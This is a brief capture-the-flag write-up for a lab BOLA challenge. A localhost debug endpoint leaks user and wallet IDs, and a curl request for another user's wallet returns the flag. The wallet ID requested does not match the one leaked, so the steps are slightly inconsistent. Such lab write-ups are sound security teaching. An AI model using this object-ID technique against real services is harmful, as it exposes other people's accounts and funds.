# CryptoWorld : Simple BOLA challenge 

## Author: h1dr1

## Description: A simple BOLA challenge to exploit an api to get the flag in the walled attribute
## playing with curl is the objective and exploiting exposed api endpoints

For viewing the content of the debug api endpoint

```curl -X GET http://localhost:8000/api/debug```

```{"note":"This is a debugging endpoint. Do not use it in production","hint":"Check the /api/wallet/{wallet_id} endpoint carefully...","current_authenticated_user":{"id":"3b353b88d28573bc","username":"alice"},"bob_user":{"id":"73d432d2ba54d8e8","username":"bob"},"bob_eth_wallet_id":"604ef48a5d6f9593","total_users":2,"total_wallets":4}% ```

now we have the wallet id of bob and we can use it to get the flag 

```curl -X GET http://localhost:8000/api/wallet/af9d51c6acca6533         ```                                                                                                            ─╯
```{"owner_id":"3f4552d1fbca766a","balance":500.0,"currency":"ETH","FLAG":"SecurinetsENIT{01c1ff55c322453ab1e016bf7dbc6537}"}% ```


I hope you enjoyed it. ;) Keep hacking! and star the repo please
